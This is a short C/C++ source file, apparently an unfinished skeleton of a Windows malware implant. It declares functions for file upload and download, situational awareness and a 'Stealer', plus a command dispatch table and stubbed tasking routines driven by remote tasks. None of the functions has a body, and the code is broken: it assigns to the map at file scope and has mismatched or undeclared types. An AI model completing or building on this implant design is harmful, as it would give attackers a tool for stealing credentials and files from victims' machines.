#include <time.h>
#include <stdio.h>
#include <string.h>
#include <unordered_map> // want to include standard c++ stl 
#include <iostream>
#include <windows.h>

/* start of implant functions*/

void FileUpload(char * Path);

void FileDownload();

void SitAware();

void Stealer();

/*Task Dispatch*/
using pfunc = void (*)(string);
unordered_map<char *, pfunc> dispatch_table;
dispatch_table["SitAware"] = &SitAware;
dispatch_table["FileDown"] = &FileDownload;
dispatch_table["FileUp"] = &FileUpload;
dispatch_table["Stealer"] = &Stealer;

//these functions are listd above but maybe we should break it up
//tasks are lists of tasks structured [cmd: , args:, taskid: ]
void tasks_dispatch(tasks);
//create results arr and return

void task_do(task);
//get cmd, args, id
//choose execute
// read output from file and return res



void tasking();

/* other helper functions necessary*/

void readFile(char * Path, char * buf);